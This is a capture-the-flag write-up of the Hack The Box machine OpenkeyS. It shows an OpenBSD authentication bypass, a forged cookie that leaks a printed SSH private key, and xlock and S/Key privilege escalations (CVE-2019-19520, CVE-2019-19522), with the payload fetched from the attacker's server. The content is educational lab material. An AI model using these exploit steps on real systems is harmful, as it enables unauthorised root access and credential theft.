## Hack The Box | OpenkeyS

### 1. Scan
```bash
kali@kali:~$ sudo nmap -A -p- 10.10.10.199
Nmap scan report for 10.10.10.199
Host is up (0.35s latency).
Not shown: 65186 closed ports, 347 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/12%OT=22%CT=1%CU=42082%PV=Y%DS=2%DC=T%G=Y%TM=5F337A2
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=RD%CI=RI%II=RI%TS=21
OS:)SEQ(SP=102%GCD=1%ISR=10B%TI=RD%CI=RI%TS=22)OPS(O1=M54DNNSNW6NNT11%O2=M5
OS:4DNNSNW6NNT11%O3=M54DNW6NNT11%O4=M54DNNSNW6NNT11%O5=M54DNNSNW6NNT11%O6=M
OS:54DNNSNNT11)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W5=4000%W6=4000)ECN(R=Y%
OS:DF=Y%T=40%W=4000%O=M54DNNSNW6%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T5(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=S%F=AR%
OS:O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
OS:=G%RUD=G)IE(R=Y%DFI=S%T=FF%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   387.12 ms 10.10.14.1
2   387.40 ms 10.10.10.199

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12179.64 seconds
```
The machine is running FreeBSD with OpenSSH and a HTTP server.

### 2. Enumeration
The HTTP server's main page is a PHP login form, which appears pretty above board. The X-Powered-By response for a 404 page shows the version to be 7.3.13, and the server is OpenBSD httpd. There are some known vulnerabilities, in particular there is one detailed at https://threatpost.com/openbsd-authentication-lpe-bugs/150849/:

.*OpenBSD uses BSD authentication, which enables the use of passwords, S/Key challenge-and-response authentication and Yubico YubiKey tokens. In each of these cases, to perform the authentication, the string “/usr/libexec/auth/login_style [-v name=value] [-s service] username class” is used. If an attacker specifies the username “-schallenge” (or “-schallenge:passwd,” the authentication is automatically successful and therefore bypassed.*

Using these usernames redirects to http://10.10.10.199/sshkey.php with the message: `OpenSSH key not found for user -schallenge`. I play around with it a bit in Burp but can't find any further way to progress.  
Running gobuster against the HTTP server showed the following locations available:
```bash
kali@kali:~$ gobuster dir -u http://10.10.10.199 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.199
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/14 06:05:07 Starting gobuster
===============================================================
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/vendor (Status: 301)
===============================================================
2020/08/14 06:12:01 Finished
===============================================================
```
In viewable index of the "includes" directory, there is a vim swp file that is readable and contains the following:
```
b0VIM 8.1�-�^���jenniferopenkeys.htb/var/www/htdocs/includes/auth.php 3210#"! Utp=ad� � =����sWB@?" �������mgC� � � { a W J @ �������vpnmUS0���J� � � � � � � � � � � ?>} session_start(); session_destroy(); session_unset();{function close_session()} $_SESSION["username"] = $_REQUEST['username']; $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT']; $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR']; $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME']; $_SESSION["login_time"] = $_SERVER['REQUEST_TIME']; $_SESSION["logged_in"] = True;{function init_session()} } return False; { else } } return True; $_SESSION['last_activity'] = $time; // Session is active, update last activity time and return True { else } return False; close_session(); { ($time - $_SESSION['last_activity']) > $session_timeout) if (isset($_SESSION['last_activity']) && $time = $_SERVER['REQUEST_TIME']; // Has the session expired? { if(isset($_SESSION["logged_in"])) // Is the user logged in? session_start(); // Start the session $session_timeout = 300; // Session timeout in seconds{function is_active_session()} return $retcode; system($cmd, $retcode); $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);{function authenticate($username, $password)
```
This appears to be some php code. From this I can get some good intel.
- The existance of the username request cookie
- The user that gets checked for an ssh key is 
- A name "jennifer" which is a potential user on the machine
- The domain jenniferopenkeys.htb
- The ../auth_helpers/check_auth path which is being passed in to $cmd
  
Firstly I can check out the second domain, jenniferopenkeys.htb, which turns out to be a clone of the previous page. This time though, I know some of the backend PHP code, including the fact that I can set a username session cookie to retrieve a user's SSH key.

### 3. Get a shell
By doing the same thing as before - logging in with -schallenge, I can pass in a username value of "jennifer" via the cookies header. This is the request that worked:
```
GET /sshkey.php HTTP/1.1
Host: jenniferopenkeys.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://jenniferopenkeys.htb/index.php
Connection: close
Cookie: PHPSESSID=3fr37qontnh4jgtbeacfge0259; username=jennifer
Upgrade-Insecure-Requests: 1
```
And here is the private key output.
```
OpenSSH key for user jennifer

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

I can now login using this key via SSH.
```bash
kali@kali:~/Desktop/htb/openkeys$ ssh -i jennifer.key jennifer@10.10.10.199
Last login: Wed Jun 24 09:31:16 2020 from 10.10.14.2
OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

openkeys$ whoami
jennifer
openkeys$ id
uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
```

### 4. Enumerate from the user
Enumerating from the user, I can confirm there is only one user's key available through sshkey.php.
Other stuff I check include:
- All /var/www stuff (as usual)
- Others users (there dont appear to be any others)
- /etc/passwd (confirms the above)
- Running processes
- Cause of the lack of bash, none of my usual enum scripts wouldn't work (running through sh didn't work either) - stuck to manual checks
  
None of these revealed any promising pathways to escalate, though due to my limited experience with Free/OpenBSD I had to do a lot of research to verify this. As a result I ended up reading further into the previously-mentioned Threatpost article, where is was mentioned there were local privelege escalation paths, all using the same S/Key authentication exploit that was used to get the user. The best writeup of the privilege escalation path I found was at: https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html.
  
In the Packet Storm article, there are two local privilege ecalation vulnerabilities detailed:

#### CVE-2019-19520, a LPE using the xlock binary
*.On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is
set-group-ID "auth", not set-user-ID; the following check is therefore
incomplete and should use issetugid() instead.*

I can verify this is consistant with the remote system by checking for this binary.
```bash
openkeys$ ls -l /usr/X11R6/bin/xlock
-rwxr-sr-x  1 root  auth  3138520 Oct 12  2019 /usr/X11R6/bin/xlock
```
Successful exploitation will get me privileges to the "auth" group, which is useful for getting root through exploitation of the next vulnerability.

#### CVE-2019-19522, Local privilege escalation via S/Key and YubiKey
.*If the S/Key or YubiKey authentication type is enabled (they are both
installed by default but disabled), then a local attacker can exploit
the privileges of the group "auth" to obtain the full privileges of the
user "root" (because login_skey and login_yubikey do not verify that the
files in /etc/skey and /var/db/yubikey belong to the correct user, and
these directories are both writable by the group "auth").*
  
As explained above, exploitation is possible with S/Key or Yubikey authentication enabled and a user in the auth group.

### 5. Escalate privileges
Firstly exploit xlock to achieve auth group privileges. I create the nessecary .c file and make it available over http server on my attacker machine. Then I can use curl to download it, compile with cc and load the file into xlock.
```bash
openkeys$ pwd
/tmp
ri.c && cc -fpic -shared -s -o swrast_dri.so swrast_dri.c && rm -rf swrast_dri.c && echo done                        <
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   374  100   374    0     0    460      0 --:--:-- --:--:-- --:--:--   460
done
openkeys$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
[5] 96077
openkeys$ _XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created.

openkeys$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66
openkeys$ id
uid=1001(jennifer) gid=11(auth) groups=1001(jennifer), 0(wheel)
```
Now the user is in the auth group.  
Moving to the next step, I can now add a root entry to SKey and change to root.
```bash
openkeys$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root && chmod 0600 /etc/skey/root && env -i TERM=vt220 su -l -a skey
S/Key Password:
openkeys# whoami                                                                                                
root
```